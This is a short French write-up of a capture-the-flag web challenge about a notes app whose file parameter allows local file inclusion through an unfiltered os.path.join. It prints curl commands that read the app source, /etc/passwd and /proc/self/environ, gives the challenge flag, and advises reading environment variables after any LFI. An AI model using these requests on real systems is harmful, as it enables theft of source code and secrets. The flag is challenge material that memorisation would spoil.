# boazak--tsevie (web / LFI, id 469)

**Flag (finale) :** `NCTF{6af2911c862115e9327c858c}`

## Contexte
Tsévié : appli de notes, fichiers texte consultables via `GET /api/note?file=...`.

## Faille
`open(os.path.join(NOTES_DIR, filename))` **sans filtrage** → un chemin absolu
écrase le join → lecture de fichier arbitraire (LFI).

## Exploitation
```bash
curl -sG $B/api/note --data-urlencode 'file=../app.py'           # lit la source
curl -sG $B/api/note --data-urlencode 'file=/etc/passwd'         # absolu OK
curl -sG $B/api/note --data-urlencode 'file=/proc/self/environ'  # -> var FLAG=NCTF{...}
```
Le flag est dans la **variable d'environnement** `FLAG` (pas un fichier `/flag`).

## Note
Pattern récurrent de la finale : `FLAG` en env → lire `/proc/self/environ` dès qu'on a une LFI.
